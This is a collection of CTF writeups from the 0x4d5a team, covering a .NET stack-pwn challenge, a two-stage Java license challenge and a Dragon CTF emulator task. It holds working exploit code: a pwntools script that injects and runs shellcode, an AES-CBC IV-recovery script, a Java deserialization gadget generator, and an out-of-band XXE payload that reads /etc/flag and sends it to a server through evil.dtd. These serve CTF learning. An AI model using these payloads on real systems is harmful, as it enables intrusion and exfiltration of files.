<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-0x4d5a-ctf
description: CTF writeups and security challenges by 0x4d5a-ctf.
---

# Writeups by 0x4d5a-ctf

Source repository: `/repos/0x4d5a-ctf`

## Repository Index

- Writeups/README.md
- Writeups/2019/dragonctf_teaser/ummmfpu/README.md
- Writeups/2019/Camp2019/licpwn_2/documentation/README.md
- Writeups/2019/Camp2019/licpwn_1/documentation/README.md
- Writeups/2019/Camp2019/core-pwn/documentation/README.md

## Writeup Content


### File: Writeups/2019/Camp2019/core-pwn/documentation/README.md

# Solution

Once the user reverses the myApp.exe he notices:
 - Its not the prettiest decompiled code, but the function is very simple
 - The loop never returns, the break out condition is never set
 - There are 32*3 8 byte intergers allocated on the stack

He should wonder what this is all about. Well, there are 4 operations that can be summerized to:
 1. P : Prints the content of the value pointed by p
 2. R : Resets the pointer back to the original address on the stack ( = start address of stack alloced space)
 3. I : Increases the pointer
 4. W : Writes hex encoded data (8 byte) to the memory pointed by the pointer

 Basically he gets a Read-Write Primitive on the CLR Stack. Quite cool. He should debug the app at his local machine and notice some RWX memory a few bytes after the stack alloc. Well, its the jitted code that gets called once the loop exits. There is also a "1" at the stack, representing the loop exit condition. He can exit the write loop writing 0x00 to this field. Futhermore (and by sure the hardest primitive to find) is the internal CLR managed pointer of the user controlled pointer on the stack (its not present in Release Mode, we got to use the Debug build). Placing the user controlled pointer on this pointer we can overwrite the address his pointer points to. So basically he got 6 things to do:
  1. Leak the Address of the RWX memory
  2. Set the user controlled pointer to the address of the CLR pointer pointing to the user controlled pointer
  3. Write the address of the RXW section to it (user controlled pointer points into this RXW memory now!)
  4. Write some shellcode using the write primitives
  5. Reset the Pointer to the original value using the "R" operation
  6. Write 0x00 to the loop condition, breaking out the loop and executing his written shellcode
  7. Profit

If he is lazy, he can brute force the offsets for step 1, 2 and 6. I did this since had many builds with different offsets. Screenshots:
![](rwxleak.PNG)

To get the write address simply perform two write operations, it will crash with an invalid address written to:
![](writeoffset.PNG)

The last thing to do is to write shellcode. Verify it via gdb:
![](writtenshellcode.PNG)

Finally break the loop and enter the shell. Profit:
![](solved.PNG)

Code (not really cleaned up. It still contains the brute force operations for the offsets):
```python
from pwn import *

PROCESS_NAME = "./myApp"
ENV = {"LD_LIBRARY_PATH":"."}
SERVER = "localhost"
PORT = 1234

context.binary = PROCESS_NAME

if args.REMOTE:
	p = remote(SERVER, PORT)
else:
	p = process(PROCESS_NAME,env=ENV)
	#gdb.attach(p)

# Leak rwx memory
for i in range(0,113):
	p.sendlineafter("Input: ", "I")

p.sendlineafter("Input: ", "P")
rwxLeak = p.recvuntil("Input:").split("\n")
print rwxLeak

rwxLeak = int(rwxLeak[1]);
print "[+] RWX Leak: 0x%x " % (rwxLeak)

p.unrecv("Input: ")

#Reset pointer
p.sendlineafter("Input: ", "R")


#Set pointer to pointer location
'''
for i in range(0,400):
	print("Trying write offset: %d" % i)
	p.sendlineafter("Input: ", "I")
	p.sendlineafter("Input: ", "W")
	p.sendline("41414242")
	p.sendlineafter("Input: ", "W")
	p.sendline("43434343")
'''


for i in range(0,108):
	p.sendlineafter("Input: ", "I")

# Write rwx addr to pointer addr
p.sendlineafter("Input: ", "W")
p.sendline(hex(rwxLeak)[2:])

shellcode = asm(shellcraft.amd64.linux.sh())
shellcode = shellcode.ljust(len(shellcode) + 8-(len(shellcode) % 8), "\x90")


# Write shellcode ...
for i in range(0, len(shellcode),8):
	p.sendlineafter("Input: ", "W")
	p.sendline(shellcode[i:i+8][::-1].encode("hex"))
	p.sendlineafter("Input: ", "I")


# Reset pointer
p.sendlineafter("Input: ", "R")


# Set loop counter
for i in range(0,32):
	#print("Writing loop condition at: %d" % i)
	p.sendlineafter("Input: ", "I")

p.sendlineafter("Input: ", "W")
p.sendline("0")


p.interactive()
```



### File: Writeups/2019/Camp2019/licpwn_1/documentation/README.md

## Comment by the author (0x4d5a)
It turned out that this challenge was harder to solve then i expected. Thats quite unfortunate, since licpwn2 wasn't solved in the consequence. I've learned by lesson and won't do multi stage challenges anymore ;)

Also it turned out that may teams got the correct IV, but didn't craft a valid license object since they missed the fact that the AES key is at the very beginning of the license file. That should've been made more clear.

# licpwn stage1
A simple/medium crypto challenge. The goal is to get the IV of the AES encryption method in order to serialize a forged object. The IV is the flag. Once a valid license object was sent, the WAR file is provided for stage2. 

## Description
The site offers a simple bootstrap webpage as shown below. It offers the user to buy some flags, but its actually all about the licensing system.
![](home.png)

Using the provided license the user receives the "redeaced" flag. But he got a valid license.
![](redacted.PNG)


## Solution
First of all the user should see the HTML comment with valid license data:
```
<!-- We got a backup license from earlier. Username: ALLES! LicenceCode: e0657c850d30211e27afe6c6edb3822c -->
```

Using the stacktraces the user can understand the encrypted file format: The key are the first 16 bytes, followed by the binary encrypted data.
![](aeserror.PNG)

Using the scheme for cbc decryption the user can guess the IV using the known plaintext:
https://upload.wikimedia.org/wikipedia/commons/2/2a/CBC_decryption.svg

The known plaintext is the java object header `0xaced`, Version 5 `0x0005`, as well as the TC_OBJECT and TC_CLASSDESC  constants `0x73` and `0x72`, followed by `0x00`. The 8th byte is unknown, but can be brute forced easily. The java serilialized object is followed by the package name, which is also leaked in the stacktrace: `com.licp`. See: https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html

Using the information the IV can be guessed using the script of localo:
![](recrypt.png)

With all those information a valid java license file can be crafted and encrypted. Filling it with the valid license data from the html comment above the user gets the WAR file:
![](flag.PNG)

```
from Crypto.Cipher import AES

data = None
with open('small.lic') as f:
	data = f.read()

key = data[:16]
message = data[16:]

fake_iv = message[:16]
fake_message = message[16:]

cipher = AES.new(key, AES.MODE_CBC, fake_iv)
dec  = cipher.decrypt(fake_message)

print("decrypted: ")
print(dec.encode('hex'))


data = '\xAC\xED\x00\x05\x73\x72\x00'
data+= '\xFF' #This byte needs to be guessed
data+='com.licp'

guess_idx = 7

cipher = AES.new(key, AES.MODE_CBC, '\x00'*16)
dec2  = cipher.decrypt(message)

a=""
for i in range(len(data)):
	a+= chr(ord(data[i])^ord(dec2[i]))

iv = a

print("partial IV: ")
print(iv)

plain = "A"*16

cipher = AES.new(key, AES.MODE_CBC, fake_iv)
dec2  = cipher.encrypt(plain)
print("Recrypt: ")

new_ciphertext = (fake_iv+dec2)

print(new_ciphertext.encode('hex'))

IV = "ABCDBBCD01230123"
cipher = AES.new(key, AES.MODE_CBC, IV)
new_plain = cipher.decrypt(new_ciphertext)
print(new_plain.encode('hex'))
```


Flag: `ALLES{a3s_st4g3}`

Done :)


### File: Writeups/2019/Camp2019/licpwn_2/documentation/README.md

# licpwn
A medium/hard Tomcat Java RE/PWN with the WAR File provided. It uses an "0-day" (not reported gadget) of the [Commons JXPath Library](http://commons.apache.org/proper/commons-jxpath/index.html) which contains an Deserialize to XXE gadget. Since userinput deserialization is possible the gadget can be used to extract the flag via OOB techniques.

## Description
From stage 1 the user gets the war file and hence can start reversing. He won't find anything special, except for the fact that he can serialize valid objects now :)


## Solution
The application takes untrusted user input and deserializes it. But the user will realize there are no RCE gadgets present. And even no known gadgets for any of those librarys. So he has to find his own gadgets, using [Gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector). 

```
0x4d5a@ubuntu:~/Downloads/gadgetinspector$ java -jar build/libs/gadget-inspector-all.jar ~/Idea/CoolCalc/target/erp.war
2019-02-11 23:36:45,643 gadgetinspector.GadgetInspector [INFO] Using WAR classpath: /home/alain/Idea/CoolCalc/target/erp.war
2019-02-11 23:36:45,910 gadgetinspector.GadgetInspector [INFO] Deleting stale data...
2019-02-11 23:36:45,910 gadgetinspector.GadgetInspector [INFO] Running method discovery...
[...]
2019-02-11 23:37:59,465 gadgetinspector.data.InheritanceDeriver [DEBUG] No class id for javax/crypto/KeyGeneratorSpi
2019-02-11 23:37:59,467 gadgetinspector.data.InheritanceDeriver [DEBUG] No class id for javax/crypto/SecretKey
2019-02-11 23:37:59,467 gadgetinspector.data.InheritanceDeriver [DEBUG] No class id for javax/crypto/SecretKeyFactorySpi
2019-02-11 23:37:59,781 gadgetinspector.GadgetInspector [INFO] Analyzing methods for passthrough dataflow...
2019-02-11 23:38:17,744 gadgetinspector.PassthroughDiscovery [DEBUG] Performing topological sort...
2019-02-11 23:38:18,755 gadgetinspector.PassthroughDiscovery [DEBUG] Outgoing references 273227, sortedMethods 273227
2019-02-11 23:39:01,611 gadgetinspector.GadgetInspector [INFO] Analyzing methods in order to build a call graph...
2019-02-11 23:39:27,188 gadgetinspector.GadgetInspector [INFO] Discovering gadget chain source methods...
2019-02-11 23:39:29,427 gadgetinspector.GadgetInspector [INFO] Searching call graph for gadget chains...
2019-02-11 23:39:41,067 gadgetinspector.GadgetChainDiscovery [INFO] Iteration 0, Search space: 1588
2019-02-11 23:39:41,182 gadgetinspector.GadgetChainDiscovery [INFO] Iteration 1000, Search space: 2436
2019-02-11 23:39:41,284 gadgetinspector.GadgetChainDiscovery [INFO] Iteration 2000, Search space: 2526
2019-02-11 23:39:41,322 gadgetinspector.GadgetChainDiscovery [INFO] Iteration 3000, Search space: 2837
2019-02-11 23:39:41,335 gadgetinspector.GadgetChainDiscovery [INFO] Iteration 4000, Search space: 2358
2019-02-11 23:39:41,383 gadgetinspector.GadgetChainDiscovery [INFO] Iteration 5000, Search space: 1700
2019-02-11 23:39:41,397 gadgetinspector.GadgetChainDiscovery [INFO] Iteration 6000, Search space: 1652
2019-02-11 23:39:41,413 gadgetinspector.GadgetChainDiscovery [INFO] Iteration 7000, Search space: 1540
2019-02-11 23:39:41,429 gadgetinspector.GadgetChainDiscovery [INFO] Iteration 8000, Search space: 1156
2019-02-11 23:39:41,436 gadgetinspector.GadgetChainDiscovery [INFO] Iteration 9000, Search space: 711
2019-02-11 23:39:41,448 gadgetinspector.GadgetChainDiscovery [INFO] Iteration 10000, Search space: 579
2019-02-11 23:39:41,469 gadgetinspector.GadgetChainDiscovery [INFO] Iteration 11000, Search space: 224
2019-02-11 23:39:41,481 gadgetinspector.GadgetChainDiscovery [INFO] Found 3 gadget chains.
2019-02-11 23:39:41,481 gadgetinspector.GadgetInspector [INFO] Analysis complete!
```

There have been 3 gadget chains found, but only one of them is actual usable:

```
javax/management/BadAttributeValueExpException.readObject(Ljava/io/ObjectInputStream;)V (1)
  org/apache/commons/jxpath/ri/model/NodePointer.toString()Ljava/lang/String; (0)
  org/apache/commons/jxpath/ri/model/NodePointer.asPath()Ljava/lang/String; (0)
  org/apache/commons/jxpath/ri/model/container/ContainerPointer.isCollection()Z (0)
  org/apache/commons/jxpath/util/ValueUtils.isCollection(Ljava/lang/Object;)Z (0)
  org/apache/commons/jxpath/util/ValueUtils.getValue(Ljava/lang/Object;)Ljava/lang/Object; (0)
  org/apache/commons/jxpath/xml/DocumentContainer.getValue()Ljava/lang/Object; (0)
  java/net/URL.openStream()Ljava/io/InputStream; (0)
```

It show a call graph for a deserialized object (BadAttributeValueExpException) which triggers the subsequent methods to finally arrive at openStream(). Once the user reverses this call he'll find this code:

```
public Object getValue() {
        if (this.document == null) {
            try {
                InputStream stream = null;

                try {
                    if (this.xmlURL != null) {
                        stream = this.xmlURL.openStream();
                    }

                    this.document = this.parseXML(stream);
```

xmlURL is user controlled, as well as document. This means he can provide an URL in the serialized object which triggers an openStream and parseXML call, resulting in an XXE.

The chain from above doesn't work since one overloaded method is not properly resolved. But the user can fix this gadget chain to achieve the same thing with a little bit different chain (using VariablePointer and instead of NodePointer). The chain looks from the callstack like this:
![](newchain.png)

The XXE result isn't reflected anywhere. Therefor the user has to use an OOB technique to extract the flag file provided at /etc/flag (change the IP addr to an external webserver!)

```
0x4d5a@ubuntu:~/Downloads/CTF/coolcalc$ cat trigger.xml 
<!DOCTYPE data [
  <!ENTITY % file SYSTEM
  "file:///etc/flag">
  <!ENTITY % dtd SYSTEM
  "http://127.0.0.1:8000/evil.dtd">
  %dtd;
]>
<data>&send;</data>
0x4d5a@ubuntu:~/Downloads/CTF/coolcalc$ cat evil.dtd 
<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:8000/?collect=%file;'>">
%all;
```
Resulting in:
```
0x4d5a@ubuntu:~/Downloads/CTF/coolcalc$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
127.0.0.1 - - [11/Feb/2019 23:15:00] "GET /trigger.xml HTTP/1.1" 200 -
127.0.0.1 - - [11/Feb/2019 23:15:01] "GET /evil.dtd HTTP/1.1" 200 -
127.0.0.1 - - [11/Feb/2019 23:15:01] "GET /?collect=ALLES{sampleflag} HTTP/1.1" 200 -
```

Code to generate the malicious license file:
```
public class Main {
    public static void main(String[] args) throws Exception {

        if (args.length != 2)
        {
            System.out.println("Usage:");
            System.out.println("Mode 1: xxepoc.jar generate <url>");
            System.out.println("Mode 2: xxepoc.jar trigger <base64Object>");
            return;
        }


        if (args[0].equals("generate")) {
            // Neues DocumentContainer Objekt mit der XML URL die wir abrufen
            DocumentContainer cont = new DocumentContainer(new URL(args[1]), "DOM");

            // Das Document in ein Variablen-Objekt Verpacken
            BasicVariables variables = new BasicVariables();
            variables.declareVariable("document", cont);

            // Ein Variablenpointer mit der soeben erstellen Variable die auf das Dokument zeigt machen
            VariablePointer pointer = new VariablePointer(variables, new QName("document"));

            // Hole das this.index Feld per Reflection
            Field field = ReflectionUtil.getField(pointer.getClass(), "index");
            // Mache aus dem private Feld ein schreibares Feld
            ReflectionUtil.makeAccessible(field);
            // Schreibe einen Wert!
            field.setInt(pointer, 1337);

            // badAttributeValueExpException erzeugen
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
            // Wieder per Reflection das interne Feld mit unserem Payload setzen
            Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
            valField.setAccessible(true);
            valField.set(badAttributeValueExpException, pointer);

            // Serialisieren und Base64 encodieren
            String serialized = toString(badAttributeValueExpException);
            System.out.println(serialized);
        }
        else if (args[0].equals("trigger"))
        {
            fromString(args[1]);
        }
        else {
            System.out.println("Invalid Action 3!");
        }
    }

    public static void serialize(final Object obj, final OutputStream out) throws IOException {
        final ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
    }

    /** Read the object from Base64 string. */
    private static Object fromString( String s ) throws IOException,
            ClassNotFoundException {
        byte [] data = Base64.getDecoder().decode( s );
        ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(  data ) );
        Object o  = ois.readObject();
        ois.close();
        return o;
    }

    /** Write the object to a Base64 string. */
    private static String toString( Serializable o ) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream( baos );
        oos.writeObject( o );
        oos.close();
        return Base64.getEncoder().encodeToString(AES.encrypt(baos.toByteArray()));
    }
}
```

Done :)


### File: Writeups/2019/dragonctf_teaser/ummmfpu/README.md

# ummmfpu

Check out gynvaels [code and solution](https://github.com/gynvael/random-stuff/tree/master/teaser_dragon_ctf_2019/ummmfpu) first :) He's the author of this amazing challenge.


Unfortunatly I didn't solve this task during the ctf. I had some minor bugs in my implementation, causing a crash at the `read_slot` and `write_slot` functions. Furthermore I didn't realize that jumps are starting from the function base offset. The frustation got me and I tried to solve other tasks. But I learned my lesson to read the instruction documentation more attentively. 

Anyways, today I finished my umFPU emulator which has all the necessary instructions and matrix operations for this challenge. It correctly validates the flag. The conditional jumps are super messy and a few hacks were nessecary, but all I'm quite happy the emulator.

Thanks for the great challenge!

Emulator in Action:

![alt text](emu.png)


### File: Writeups/README.md

# Writeups
Writeups for ctf challenges

